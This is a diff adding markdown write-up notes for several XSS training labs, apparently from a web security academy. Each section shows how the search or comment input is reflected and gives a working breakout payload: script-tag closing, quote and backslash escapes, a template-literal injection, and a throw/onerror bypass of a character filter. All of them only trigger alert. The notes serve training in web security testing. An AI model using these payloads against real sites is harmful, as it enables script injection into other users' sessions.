@@ -359,3 +359,142 @@ Response:
 ```
 /?'accesskey='x'onclick='alert(1)
 ```
+
+### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
+
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
+
+**Search -> 12345678**
+
+```
+Response:
+<script>
+	var searchTerms = '12345678';
+	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+Single quote gets backslash-escaped
+
+```
+</script><script>alert(document)//
+
+Response:
+var searchTerms = '</script><script>alert(document)//';
+
+OR
+
+</script><script>alert(1)</script>
+```
+
+### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string.
+
+**Search -> 12345678**
+
+```
+Response:
+<script>
+	var searchTerms = '12345678';
+	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+Angle brackets get encoded.
+
+```
+';alert(document);//
+
+'-alert(1)-'
+```
+
+### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
+
+**Search -> 12345678**
+
+```
+Response:
+<script>
+	var searchTerms = '12345678';
+	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+```
+'-alert(1)-'
+
+Response:
+var searchTerms = '\'-alert(1)-\'';
+```
+
+Single quote gets backslash-escaped. Can we bypass adding a backslash and double slash?
+
+```
+\'-alert(1)//
+```
+
+### Lab: Reflected XSS in a JavaScript URL with some characters blocked
+
+This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.
+
+Post a comment with these to name and comment : `< > / ' " : ; =`
+
+```
+<p>&lt; &gt; / &apos; &quot; : ; =</p>
+```
+
+`/ : ; =` are allowed.
+
+```
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finally(_ => window.location = '/')">Back to Blog</a>
+```
+
+```
+GET /post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 HTTP/1.1
+
+Decoded:
+GET /post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:' HTTP/1.1
+
+The link:
+javascript:fetch('/analytics', {method:'post',body:'/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
+```
+
+### Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+This lab contains a stored cross-site scripting vulnerability in the comment functionality.
+
+**Post a comment:**
+
+```
+In response:
+<a id="author" href="https://www.test4.com" onclick="var tracker={track(){}};tracker.track('https://www.test4.com');">test2</a>
+```
+
+```
+&apos;-alert(1)-&apos;
+&apos;alert(1);//
+
+onclick="var tracker={track(){}};tracker.track('https://www.test4.com&apos;-alert(1)-&apos;');"
+```
+
+### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped.
+
+**Search -> 12345678**
+
+```
+<script>
+	var message = `0 search results for '12345678'`;
+	document.getElementById('searchMessage').innerText = message;
+</script>
+```
+
+There is a JavaScript template string.
+
+```
+${alert(1)}
+```
